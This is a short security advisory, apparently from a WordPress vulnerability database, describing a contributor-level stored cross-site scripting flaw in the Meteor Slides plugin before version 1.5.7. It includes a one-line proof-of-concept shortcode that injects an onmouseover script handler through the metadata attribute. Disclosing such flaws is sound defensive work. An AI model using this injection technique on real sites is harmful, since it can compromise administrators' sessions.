## WordPress Plugin Vulnerabilities

# Meteor Slides < 1.5.7 - Contributor+ Stored XSS

### Description

The plugin does not validate and escape some of its shortcode attributes before outputting them back in the page, which could allow users with a role as low as contributor to perform Stored Cross-Site Scripting attacks which could be used against high privilege users such as admins.

### Proof of Concept

[meteor\_slideshow slideshow='slideshow-category' metadata='" onmouseover="alert(1)"']
Note: A Slideshow Category and Slide must exist.

### Affects Plugins
